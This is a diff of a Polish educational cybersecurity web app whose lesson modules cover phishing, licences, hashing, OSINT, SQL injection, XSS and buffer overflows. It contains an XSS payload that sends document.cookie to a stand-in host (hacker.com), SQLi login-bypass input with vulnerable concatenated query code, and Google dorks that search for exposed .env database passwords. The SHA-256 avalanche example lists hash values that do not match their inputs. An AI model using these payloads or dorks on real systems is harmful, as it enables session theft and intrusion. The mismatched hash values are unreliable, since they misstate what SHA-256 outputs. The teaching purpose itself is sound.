+                    </div>
+                    <div class="p-2.5 rounded bg-black/40 border border-slate-800">
+                      <strong class="text-red-400 font-mono block">2. Autorytet i Lęk</strong>
+                      „Policja / Komornik / Dział Bezpieczeństwa: Twoje konto zostało zablokowane z powodu nielegalnej aktywności”. Strach przed karą paraliżuje logikę.
+                    </div>
+                    <div class="p-2.5 rounded bg-black/40 border border-slate-800">
+                      <strong class="text-amber-400 font-mono block">3. Chciwość i Okazja</strong>
+                      „Wygrałeś iPhone'a 16 / Darmowe Discord Nitro na rok!”. Oferta zbyt piękna, by była prawdziwa.
+                    </div>
+                    <div class="p-2.5 rounded bg-black/40 border border-slate-800">
+                      <strong class="text-amber-400 font-mono block">4. Uśpienie Czujności (Mikro-kwoty)</strong>
+                      „Dopłać 1,50 PLN za dezynfekcję przesyłki”. Ofiara myśli: „Co mi szkodzi, to tylko złoty pięćdziesiąt”. Prawdziwym celem jest jednak podanie loginu i hasła do bankowości!
+                    </div>
+                  </div>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <span class="text-cyber-danger font-bold block mb-1">2. Fałszywy Nadawca</span>
-                  <p class="text-slate-400">Sprawdź co jest po znaku @. Mail od „Netflixa” może mieć domenę np. <code>support@dziwny-serwer.xyz</code>.</p>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-warning">🔍</span> Jak demaskować fałszywy adres URL w 5 sekund?
+                </h4>
+                <p>
+                  Domena w Internecie czytana jest <strong>od prawej do lewej strony</strong>, patrząc na elementy oddzielone kropkami przed pierwszym ukośnikiem <code>/</code>:
+                </p>
+
+                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 font-mono text-xs space-y-2">
+                  <div class="text-emerald-400">
+                    ✓ PRAWIDŁOWY ADRES: <span class="bg-emerald-950/60 px-1 py-0.5 rounded">https://inpost.pl/sledzenie-przesylek</span>
+                    <span class="text-slate-400 text-[10px] block mt-0.5">Główna domena to bezsprzecznie inpost.pl.</span>
+                  </div>
+                  <div class="text-red-400">
+                    ✗ OSZUSTWO (PHISHING): <span class="bg-red-950/60 px-1 py-0.5 rounded">http://inpost.pl.platnosc-paczka-24.xyz/login</span>
+                    <span class="text-slate-400 text-[10px] block mt-0.5">Prawdziwa domena to platnosc-paczka-24.xyz! Słowo inpost.pl jest tylko zmyśloną subdomeną oszusta!</span>
+                  </div>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <span class="text-cyber-danger font-bold block mb-1">3. Podmieniony Link</span>
-                  <p class="text-slate-400">Zanim klikniesz, najedź kursorem myszy na odnośnik i zobacz dokąd naprawdę prowadzi.</p>
+
+                <div class="p-3 bg-cyber-neon/10 border border-cyber-neon/30 rounded-lg text-slate-300 font-mono text-xs">
+                  <strong class="text-cyber-neon block mb-1">🚨 PAMIĘTAJ NA CAŁE ŻYCIE:</strong>
+                  Żaden bank, kurier ani portal społecznościowy <strong>nigdy nie wysyła linków do logowania w wiadomościach SMS</strong>. Podejrzany SMS przekaż od razu na bezpłatny numer <strong>8080</strong> (CERT Polska)!
                 </div>
               </div>
             `
           },
           {
             id: 'lo-m4',
-            tag: 'LEKCJE 4-5',
-            title: 'Prawo w IT: Licencje Open Source (MIT vs GPL) i Etyka AI',
+            tag: 'LEKCJE 4-5 • PRAWO & ETYKA',
+            title: 'Prawo w IT: Licencje Open Source i Etyka Sztucznej Inteligencji',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                Korzystanie z kodu z platformy GitHub to codzienność programistów. Nie każdy kod jest jednak darmowy w każdym zastosowaniu!
-              </p>
-              <div class="my-3 space-y-2 text-xs font-mono">
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 flex justify-between items-center">
-                  <div>
-                    <strong class="text-cyber-neon">Licencja MIT:</strong>
-                    <span class="text-slate-400 font-sans block mt-0.5">Maksymalna wolność. Możesz używać kodu w celach komercyjnych, modyfikować i zamykać źródła.</span>
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Współczesne programowanie przypomina budowanie z klocków LEGO – programiści rzadko piszą wszystko od zera, korzystając z bibliotek open-source z serwisów GitHub czy npm. Jednak sam fakt, że kod jest publicznie widoczny w Internecie, <strong>nie oznacza, że można go używać bez ograniczeń</strong>!
+                </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-cyan font-bold flex items-center gap-2">
+                    <span>⚖️ PORÓWNANIE DWÓCH GŁÓWNYCH FILOZOFII LICENCYJNYCH:</span>
                   </div>
-                  <span class="text-cyber-neon px-2 py-1 rounded bg-cyber-neon/10 border border-cyber-neon/30 text-[10px]">Permisywna</span>
+
+                  <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs font-sans">
+                    <div class="p-3 rounded-lg bg-cyber-card border border-emerald-500/30 space-y-1.5">
+                      <div class="flex justify-between items-center font-mono">
+                        <strong class="text-emerald-400 text-sm">Licencja MIT</strong>
+                        <span class="text-[10px] px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400">Permisywna</span>
+                      </div>
+                      <p class="text-slate-300 text-[11px] leading-relaxed">
+                        Maksymalna swoboda. Wolno Ci używać kodu w celach edukacyjnych, komercyjnych, modyfikować go i zamykać źródła. Jedynym wymogiem jest zachowanie w plikach notki o oryginalnych prawach autorskich twórcy.
+                      </p>
+                      <span class="text-slate-500 font-mono text-[10px] block">Przykłady: React, Vue.js, jQuery, Bootstrap.</span>
+                    </div>
+
+                    <div class="p-3 rounded-lg bg-cyber-card border border-purple-500/30 space-y-1.5">
+                      <div class="flex justify-between items-center font-mono">
+                        <strong class="text-purple-400 text-sm">GNU GPL v3</strong>
+                        <span class="text-[10px] px-2 py-0.5 rounded bg-purple-500/10 text-purple-400">Copyleft (Wirusowa)</span>
+                      </div>
+                      <p class="text-slate-300 text-[11px] leading-relaxed">
+                        Zasada wzajemności. Jeśli zmodyfikujesz i rozpowszechnisz program bazujący na kodzie GPL, <strong>Twój cały program również musi zostać udostępniony na licencji GPL z otwartym kodem źródłowym</strong>!
+                      </p>
+                      <span class="text-slate-500 font-mono text-[10px] block">Przykłady: Linux Kernel, Git, OBS Studio, Blender.</span>
+                    </div>
+                  </div>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 flex justify-between items-center">
-                  <div>
-                    <strong class="text-cyber-cyan">Licencja GNU GPL:</strong>
-                    <span class="text-slate-400 font-sans block mt-0.5">Zasada Copyleft. Jeśli zmodyfikujesz kod GPL i go rozpowszechnisz, cały Twój program musi być udostępniony na licencji GPL.</span>
-                  </div>
-                  <span class="text-cyber-cyan px-2 py-1 rounded bg-cyber-cyan/10 border border-cyber-cyan/30 text-[10px]">Wirusowa</span>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-purple">🤖</span> Kto jest autorem kodu wygenerowanego przez AI?
+                </h4>
+                <p>
+                  Zgodnie z art. 1 polskiej Ustawy o prawie autorskim i prawach pokrewnych, przedmiotem prawa autorskiego jest utwór będący <em>„rezultatem działalności twórczej o indywidualnym charakterze, ustalonej w jakiejkolwiek postaci, ucieleśnionej przez CZŁOWIEKA”</em>.
+                </p>
+
+                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 text-slate-300 font-mono text-[11px] space-y-1.5">
+                  <strong class="text-cyber-warning block">Wnioski praktyczne dla uczniów i programistów:</strong>
+                  <ul class="list-disc list-inside font-sans space-y-1 text-slate-400">
+                    <li>Kod wygenerowany w całości przez prompt do ChatGPT/Claude <strong>nie podlega ochronie prawa autorskiego</strong> – znajduje się w domenie publicznej.</li>
+                    <li>Modele językowe były trenowane na miliardach linijek kodu z GitHuba – istnieje ryzyko, że AI zreplikuje fragment kodu objęty licencją GPL do Twojego zamkniętego projektu.</li>
+                    <li>Pełną odpowiedzialność prawną za działanie, błędy i luki bezpieczeństwa w kodzie ponosi programista, który ten kod wdrożył, a nie dostawca sztucznej inteligencji!</li>
+                  </ul>
                 </div>
               </div>
             `
@@ -1831,89 +2447,250 @@ print(f"Hash: {hash_val}")</code></pre>
         modules: [
           {
             id: 'tech-m1',
-            tag: 'PROJEKT 1',
-            title: 'Kryptografia w Praktyce: Hashowanie vs Szyfrowanie Symetryczne',
+            tag: 'PROJEKT 1 • KRYPTOGRAFIA',
+            title: 'Kryptografia w Praktyce: Architektura SHA-256 i Efekt Lawinowy',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                Jako przyszli technicy informatycy i programiści musicie rozróżniać podstawowe pojęcia: szyfrowanie (odwracalne z kluczem) oraz hashowanie (jednokierunkowy skrót matematyczny).
-              </p>
-              <div class="my-4 p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-2">
-                <span class="text-xs font-mono text-cyber-neon font-bold">ALGORITM SHA-256:</span>
-                <p class="text-xs text-slate-300 leading-relaxed font-sans">
-                  Przekształca dowolnie długi ciąg wejściowy w stały 256-bitowy (64 znaki hex) skrót. Cechy kluczowe: jednokierunkowość (nie istnieje funkcja odwrotna) oraz odporność na kolizje (niemożliwe znalezienie dwóch różnych tekstów dających ten sam hash).
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Jako przyszli programiści i technicy IT musicie precyzyjnie rozróżniać dwa pojęcia: <strong>szyfrowanie</strong> (operację dwukierunkową przy użyciu klucza) oraz <strong>hashowanie</strong> (jednokierunkową funkcję skrótu).
                 </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-neon font-bold flex items-center gap-2">
+                    <span>⚙️ WEWNĘTRZNA ARCHITEKTURA ALGORYTMU SHA-256:</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    Algorytm SHA-256 (Secure Hash Algorithm, opracowany przez NIST/NSA) przetwarza strumień danych wejściowych w następujących krokach:
+                  </p>
+                  <ol class="list-decimal list-inside space-y-1.5 text-[11px] text-slate-400">
+                    <li><strong>Dopełnienie (Padding):</strong> Do wiadomości doklejany jest bit '1', ciąg zer oraz 64-bitowa długość pierwotnej wiadomości, aby rozmiar był wielokrotnością 512 bitów.</li>
+                    <li><strong>Podział na bloki:</strong> Wiadomość dzielona jest na bloki o długości 512 bitów (szesnaście 32-bitowych słów).</li>
+                    <li><strong>Inicjalizacja rejestrów:</strong> 8 rejestrów początkowych (A, B, C, D, E, F, G, H) przyjmuje stałe wartości będące pierwszymi 32 bitami części ułamkowych pierwiastków kwadratowych z pierwszych 8 liczb pierwszych (od 2 do 19).</li>
+                    <li><strong>Pętla 64 rund:</strong> W każdej rundzie wykonywane są operacje bitowe (XOR, rotacja cykliczna, funkcje nieliniowe Ch i Maj oraz dodawanie modulo $2^{32}$).</li>
+                    <li><strong>Wynik:</strong> Po przetworzeniu wszystkich bloków stan 8 rejestrów tworzy ostateczny 256-bitowy ciąg (64 znaki w zapisie szesnastkowym).</li>
+                  </ol>
+                </div>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-cyan">🌊</span> Czym jest Efekt Lawinowy (Avalanche Effect)?
+                </h4>
+                <p>
+                  Kluczową cechą kryptograficzną dobrej funkcji skrótu jest to, że zmiana <strong>chociażby pojedynczego bitu na wejściu</strong> (np. zamiana małej litery 'a' na dużą 'A' lub dopisanie kropki na końcu) powoduje, że <strong>średnio 50% wszystkich bitów wyjściowych ulega zmianie</strong> w sposób całkowicie pseudolosowy.
+                </p>
+
+                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 font-mono text-[11px] space-y-1">
+                  <div class="text-slate-400">sha256("Haslo123") = <span class="text-cyber-neon">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</span></div>
+                  <div class="text-slate-400">sha256("Haslo124") = <span class="text-cyber-cyan">9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca7</span></div>
+                  <span class="text-[10px] text-slate-500 block pt-1 font-sans">Pomimo zmiany tylko 1 cyfry, żaden ze znaków hasha nie pozostał na swoim miejscu! Haker nie może przewidzieć wzorca.</span>
+                </div>
               </div>
             `
           },
           {
             id: 'tech-m2',
-            tag: 'PROJEKT 2',
-            title: 'Sól Kryptograficzna i Ataki Słownikowe (Rainbow Tables)',
+            tag: 'PROJEKT 2 • KRYPTOGRAFIA',
+            title: 'Sól Kryptograficzna, Tęczowe Tablice i Nowoczesne KDF',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                Zwykły hash hasła <code class="text-cyber-purple">admin</code> to zawsze ten sam ciąg znaków. Hakerzy przygotowali gigantyczne bazy danych z wyliczonymi hashami dla miliardów popularnych słów – nazywamy je <strong>Rainbow Tables (Tęczowe Tablice)</strong>.
-              </p>
-              <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark my-3 space-y-2">
-                <strong class="text-cyber-cyan text-xs font-mono">ROZWIĄZANIE: SÓL (SALT)</strong>
-                <p class="text-xs text-slate-300 font-sans leading-relaxed">
-                  Przed obliczeniem hasha serwer losuje unikalny ciąg (np. 16 bajtów losowych) i łączy go z hasłem: <code>hash = sha256(haslo + salt)</code>. Sprawia to, że nawet jeśli dwóch użytkowników ma to samo hasło, ich hashe w bazie są całkowicie różne!
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Samodzielne hashowanie haseł funkcją SHA-256 było standardem 15 lat temu. Dzisiaj jest to <strong>poważny błąd architektoniczny</strong>. Dlaczego?
                 </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-purple font-bold flex items-center gap-2">
+                    <span>⚡ ZAGROŻENIE 1: TĘCZOWE TABLICE (RAINBOW TABLES)</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    Ponieważ funkcja skrótu jest deterministyczna, <code>sha256("admin")</code> zawsze daje ten sam wynik. Cyberprzestępcy wygenerowali olbrzymie, terabajtowe bazy par <em>[tekst jawny &rarr; hash]</em> dla miliardów haseł słownikowych. Po kradzieży bazy odnalezienie hasła w tabeli tęczowej zajmuje ułamek sekundy!
+                  </p>
+                </div>
+
+                <div class="p-4 rounded-xl border border-cyber-cyan/40 bg-cyber-dark space-y-2 font-mono">
+                  <div class="text-cyber-cyan font-bold flex items-center gap-2">
+                    <span>🛡️ ROZWIĄZANIE: LOSOWA SÓL KRYPTOGRAFICZNA (SALT)</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    Przed obliczeniem hasha serwer generuje kryptograficznie silny losowy ciąg (np. 16 bajtów z <code>/dev/urandom</code>):
+                  </p>
+                  <pre class="bg-black/60 p-2 rounded text-cyber-neon text-[10px]">sol = secrets.token_hex(16) # np. '4f8a9b1c2d3e4f5a'
+hash_bazy = sha256(haslo + sol)</pre>
+                  <p class="text-[11px] text-slate-400 font-sans">
+                    Sól jest jawnie zapisywana w bazie obok hasha. Dzięki temu haker musi przeliczyć całą tabelę tęczową od nowa dla każdego pojedynczego użytkownika, co czyni atak ekonomicznie nieopłacalnym!
+                  </p>
+                </div>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-warning">⚠️</span> Dlaczego SHA-256 jest za szybki dla haseł?
+                </h4>
+                <p>
+                  Współczesna karta graficzna <strong>NVIDIA RTX 4090</strong> potrafi obliczyć ponad <strong>8 miliardów hashów SHA-256 na sekundę</strong>! Z tego powodu do przechowywania haseł stosuje się tzw. <em>wolne funkcje wyprowadzania klucza (KDF - Key Derivation Functions)</em>:
+                </p>
+
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 font-mono text-[11px]">
+                  <div class="p-2.5 rounded bg-cyber-dark border border-slate-800">
+                    <strong class="text-cyber-neon block">bcrypt</strong>
+                    <span class="text-slate-400 font-sans">Regulowany koszt obliczeniowy (work factor). Standard rynkowy od ponad dekady.</span>
+                  </div>
+                  <div class="p-2.5 rounded bg-cyber-dark border border-slate-800">
+                    <strong class="text-cyber-cyan block">Argon2id</strong>
+                    <span class="text-slate-400 font-sans">Zwycięzca Password Hashing Competition. Wymaga dużej ilości pamięci RAM (Memory-Hard), blokując koparki ASIC/GPU.</span>
+                  </div>
+                  <div class="p-2.5 rounded bg-cyber-dark border border-slate-800">
+                    <strong class="text-cyber-purple block">PBKDF2</strong>
+                    <span class="text-slate-400 font-sans">Tysiące iteracji HMAC. Powszechnie stosowany m.in. w systemach iOS i Android.</span>
+                  </div>
+                </div>
               </div>
             `
           },
           {
             id: 'tech-m3',
-            tag: 'PROJEKT 3',
-            title: 'Biały Wywiad (OSINT) & Studium Przypadku: Morele i ALAB',
+            tag: 'PROJEKT 3 • OSINT',
+            title: 'Biały Wywiad (OSINT), Google Dorking & Studium Wycieków Morele i ALAB',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                <strong>OSINT (Open-Source Intelligence)</strong> to sztuka pozyskiwania informacji ze źródeł jawnych. W pracy audytora i red-teamera OSINT służy do profilowania celów ataku.
-              </p>
-              <div class="my-3 space-y-2 text-xs font-mono">
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <strong class="text-cyber-warning">AFERA MORELE (2018):</strong>
-                  <p class="text-slate-400 font-sans mt-0.5">Wyciek bazy ponad 2 milionów klientów. Oprócz hashy hakerzy uzyskali imiona, numery telefonów oraz numery PESEL, co umożliwiło masowe ataki phishingowe na klientów sklepu.</p>
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  <strong>OSINT (Open-Source Intelligence)</strong> to legalna sztuka pozyskiwania i analizowania informacji z publicznie dostępnych rejestrów, baz danych, metadanych plików oraz mediów społecznościowych. W pracy audytora Red Team OSINT służy do zmapowania infrastruktury firmy przed testem penetracyjnym.
+                </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-purple font-bold flex items-center gap-2">
+                    <span>🕵️ GOOGLE DORKING (ZAAWANSOWANE OPERATORY WYSZUKIWARKI):</span>
+                  </div>
+                  <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-[11px] font-sans">
+                    <div class="p-2 rounded bg-black/40 border border-slate-800 font-mono">
+                      <strong class="text-cyber-cyan">site:domena.pl</strong>
+                      <span class="text-slate-400 block text-[10px] font-sans">Ogranicza wyniki wyłącznie do wybranej domeny.</span>
+                    </div>
+                    <div class="p-2 rounded bg-black/40 border border-slate-800 font-mono">
+                      <strong class="text-cyber-cyan">filetype:env DB_PASSWORD</strong>
+                      <span class="text-slate-400 block text-[10px] font-sans">Szuka przypadkowo upublicznionych plików konfiguracyjnych z hasłami do baz.</span>
+                    </div>
+                    <div class="p-2 rounded bg-black/40 border border-slate-800 font-mono">
+                      <strong class="text-cyber-cyan">inurl:admin/login.php</strong>
+                      <span class="text-slate-400 block text-[10px] font-sans">Wyszukuje ukryte panele administracyjne w adresie URL.</span>
+                    </div>
+                    <div class="p-2 rounded bg-black/40 border border-slate-800 font-mono">
+                      <strong class="text-cyber-cyan">intitle:"Index of /"</strong>
+                      <span class="text-slate-400 block text-[10px] font-sans">Odsłania serwery z włączonym listowaniem katalogów (Directory Listing).</span>
+                    </div>
+                  </div>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <strong class="text-cyber-danger">AFERA ALAB LABORATORIA (2023):</strong>
-                  <p class="text-slate-400 font-sans mt-0.5">Atak typu ransomware. Wyciekły wrażliwe dane medyczne, PESEL-e i wyniki badań laboratoryjnych tysięcy pacjentów z całej Polski.</p>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-danger">🚨</span> Studium Przypadku: Afera ALAB Laboratoria (Listopad 2023)
+                </h4>
+                <div class="p-4 rounded-xl border border-red-500/40 bg-red-950/20 space-y-2 text-xs">
+                  <p class="text-slate-300">
+                    Polska sieć laboratoriów medycznych ALAB padła ofiarą grupy ransomware <strong>RA World</strong>. Napastnicy uzyskali dostęp do wewnętrznej sieci, zaszyfrowali serwery i wykradli terabajty danych pacjentów z lat 2017-2023.
+                  </p>
+                  <ul class="list-disc list-inside space-y-1 text-slate-400 font-mono text-[11px]">
+                    <li><strong>Wykradzione dane:</strong> Imię, nazwisko, PESEL, adres zamieszkania, numer telefonu, nazwisko lekarza zlecającego oraz pełne wyniki badań (krew, biochemia, markery nowotworowe, testy genetyczne).</li>
+                    <li><strong>Konsekwencje:</strong> Pacjenci musieli zastrzegać numery PESEL w aplikacji mObywatel, aby uniknąć wyłudzenia kredytów. Urząd Ochrony Danych Osobowych (UODO) wszczął postępowanie wyjaśniające w sprawie naruszenia procedur RODO.</li>
+                  </ul>
                 </div>
               </div>
             `
           },
           {
             id: 'tech-m4',
-            tag: 'PROJEKT 4',
-            title: 'Bezpieczeństwo Aplikacji Webowych: SQL Injection & XSS',
+            tag: 'PROJEKT 4 • WEB AUDIT',
+            title: 'Bezpieczeństwo Aplikacji Webowych (OWASP Top 10): SQLi i XSS',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                Najczęstsze błędy według OWASP Top 10 to brak walidacji danych wejściowych od użytkownika.
-              </p>
-              <div class="my-3 grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs font-mono">
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <strong class="text-cyber-purple block mb-1">SQL Injection (SQLi)</strong>
-                  <p class="text-slate-400 font-sans">Wstrzyknięcie <code>' OR '1'='1 --</code> do formularza. Zabezpieczenie: Prepared Statements (sparametryzowane zapytania w PDO / SQLAlchemy).</p>
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Organizacja <strong>OWASP (Open Worldwide Application Security Project)</strong> co kilka lat publikuje listę 10 najbardziej krytycznych luk w aplikacjach internetowych. Na czele od lat znajdują się błędy wstrzykiwania kodu (Injection) oraz Cross-Site Scripting (XSS).
+                </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-purple font-bold flex items-center gap-2">
+                    <span>💉 ANATOMIA ATAKU SQL INJECTION:</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    Podatność pojawia się, gdy programista łączy dane wejściowe od użytkownika z zapytaniem SQL za pomocą zwykłej konkatenacji stringów:
+                  </p>
+                  <div class="bg-black/60 p-2.5 rounded border border-red-500/40 text-red-300 text-[10px]">
+                    # PODATNY KOD BACKENDOWY:<br>
+                    query = "SELECT * FROM users WHERE login = '" + input_user + "' AND pass = '" + input_pass + "'";
+                  </div>
+                  <p class="text-[11px] text-slate-400 font-sans">
+                    Gdy haker wpisze jako login ciąg: <code class="text-cyber-neon font-bold">admin' OR '1'='1</code>, baza danych otrzyma zapytanie:
+                  </p>
+                  <div class="bg-black/60 p-2.5 rounded border border-slate-700 text-cyber-cyan text-[10px]">
+                    SELECT * FROM users WHERE login = 'admin' OR '1'='1' AND pass = '...';
+                  </div>
+                  <p class="text-[11px] text-slate-400 font-sans">
+                    Ponieważ warunek <code>'1'='1'</code> jest matematyczną prawdą (TRUE), baza danych zwraca rekord pierwszego użytkownika w tabeli (zazwyczaj Administratora) i loguje hakera bez hasła!
+                  </p>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <strong class="text-cyber-neon block mb-1">Cross-Site Scripting (XSS)</strong>
-                  <p class="text-slate-400 font-sans">Wstrzyknięcie złośliwego kodu JS <code>&lt;script&gt;</code> do komentarza. Haker kradnie <code>document.cookie</code> sesji zalogowanego użytkownika.</p>
+
+                <div class="p-4 rounded-xl border border-emerald-500/40 bg-cyber-dark space-y-2 font-mono">
+                  <div class="text-emerald-400 font-bold flex items-center gap-2">
+                    <span>🛡️ JEDYNA POPRAWNA OBRONA: PREPARED STATEMENTS</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    Bindowanie parametrów rozdziela fazę kompilacji zapytania SQL od fazy przekazania danych. Baza danych traktuje dane użytkownika wyłącznie jako literały tekstowe:
+                  </p>
+                  <div class="bg-black/60 p-2.5 rounded border border-slate-700 text-emerald-300 text-[10px]">
+                    # BEZPIECZNY KOD (PYTHON / SQLITE):<br>
+                    cursor.execute("SELECT * FROM users WHERE login = ? AND pass = ?", (input_user, input_pass))
+                  </div>
                 </div>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-neon">🌐</span> Czym jest Cross-Site Scripting (XSS)?
+                </h4>
+                <p>
+                  Atak XSS polega na wstrzyknięciu złośliwego kodu JavaScript do bazy serwisu (np. w treści komentarza pod postem):
+                </p>
+                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 font-mono text-[11px] text-cyber-warning">
+                  &lt;script&gt;fetch('https://hacker.com/steal?c=' + document.cookie)&lt;/script&gt;
+                </div>
+                <p class="text-[11px] text-slate-400">
+                  Gdy inny użytkownik (np. moderator) wyświetli stronę z tym komentarzem, jego przeglądarka bezwiednie wykona obcy skrypt i wyśle ciasteczko sesyjne (Session ID) na serwer przestępcy. Obrona: escapowanie znaków HTML (np. zamiana <code>&lt;</code> na <code>&amp;lt;</code>) oraz ustawienie ciasteczek z flagą <code>HttpOnly</code>.
+                </p>
               </div>
             `
           },
           {
             id: 'tech-m5',
             tag: 'CIEKAWOSTKA ARCHITEKTONICZNA',
-            title: 'Memory Safety: Dlaczego C/C++ Ma „Dziury”, a Przyszłością Jest Rust?',
+            title: 'Memory Safety: Stack Buffer Overflow w C vs Rewolucja Języka Rust',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                Ponad 70% krytycznych luk bezpieczeństwa wykrywanych przez Microsoft i Google to błędy zarządzania pamięcią (Buffer Overflow, Use-After-Free).
-              </p>
-              <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark my-3 space-y-2">
-                <span class="text-xs font-mono text-emerald-400 font-bold">RUST BORROW CHECKER:</span>
-                <p class="text-xs text-slate-300 font-sans leading-relaxed">
-                  Język Rust eliminuje te błędy już na etapie kompilacji poprzez system własności (ownership) i pożyczania (borrowing), bez konieczności używania wolnego Garbage Collectora. Agencja Bezpieczeństwa Narodowego USA (NSA) oficjalnie zaleca migrację z C/C++ na języki memory-safe!
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Według oficjalnych raportów inżynierów Microsoft oraz Google Chromium, <strong>około 70% wszystkich krytycznych luk bezpieczeństwa (CVE)</strong> wykrywanych w systemach Windows, Linux i przeglądarce Chrome wynika z błędów zarządzania pamięcią (Memory Safety) w kodzie napisanym w językach C i C++.
                 </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-danger font-bold flex items-center gap-2">
+                    <span>💥 PRZEPEŁNIENIE BUFORA STOSU (STACK BUFFER OVERFLOW):</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    W języku C programista ręcznie zarządza pamięcią. Przypuśćmy, że funkcja alokuje tablicę 32 bajtów na stosie, a następnie wywołuje funkcję <code>strcpy()</code> lub <code>gets()</code>, wpisując 128 bajtów nadesłanych z sieci:
+                  </p>
+                  <div class="bg-black/60 p-2.5 rounded border border-slate-800 text-[10px] text-slate-300 overflow-x-auto">
+                    [ Bufor 32 bajty ] &rarr; [ Zapisany wskaźnik ramki EBP ] &rarr; <span class="text-red-400 font-bold">[ Adres Powrotu EIP / RIP ]</span> &rarr; Shellcode
+                  </div>
+                  <p class="text-[11px] text-slate-400 font-sans">
+                    Nadmiarowe bajty „wylewają się” poza bufor, nadpisując adres powrotu funkcji (rejestr RIP). Gdy funkcja kończy działanie, procesor nie wraca do programu, lecz skacze pod adres podany przez hakera i wykonuje złośliwy kod wstrzyknięty w pamięci!
+                  </p>
+                </div>
+
+                <div class="p-4 rounded-xl border border-emerald-500/40 bg-cyber-dark space-y-2 font-mono">
+                  <div class="text-emerald-400 font-bold flex items-center gap-2">
+                    <span>🦀 DLACZEGO ŚWIAT PRZECHODZI NA RUST?</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 font-sans leading-normal">
+                    Język Rust rozwiązuje problem pamięci na etapie <strong>kompilacji</strong> za pomocą unikalnego mechanizmu <strong>Borrow Checkera</strong> oraz reguł własności (Ownership):
+                  </p>
+                  <ul class="list-disc list-inside space-y-1 text-slate-400 text-[11px] font-sans">
+                    <li>Każda wartość w pamięci ma dokładnie jednego właściciela (zmienną).</li>
+                    <li>Gdy właściciel wychodzi poza zasięg (scope), pamięć jest natychmiast automatycznie zwalniana (brak wycieków pamięci i brak błędu Use-After-Free).</li>
+                    <li>Wszelkie próby wyjścia poza zakres tablicy kończą się natychmiastowym bezpiecznym panikiem programu (Panic), uniemożliwiając nadpisanie pamięci procesora.</li>
+                    <li>Wszystko to dzieje się <strong>bez konieczności używania powolnego odśmiecacza pamięci (Garbage Collector)</strong>! Z tego powodu kernel Linuksa od wersji 6.1 oficjalnie wspiera pisanie sterowników w języku Rust.</li>
+                  </ul>
+                </div>
               </div>
             `
           }
@@ -1946,7 +2723,7 @@ print(f"Hash: {hash_val}")</code></pre>
             title: 'Ataki Webowe OWASP: SQL Injection na Żywo',
             points: [
               'Podatne zapytanie: SELECT * FROM users WHERE user = "$login" AND pass = "$pass";',
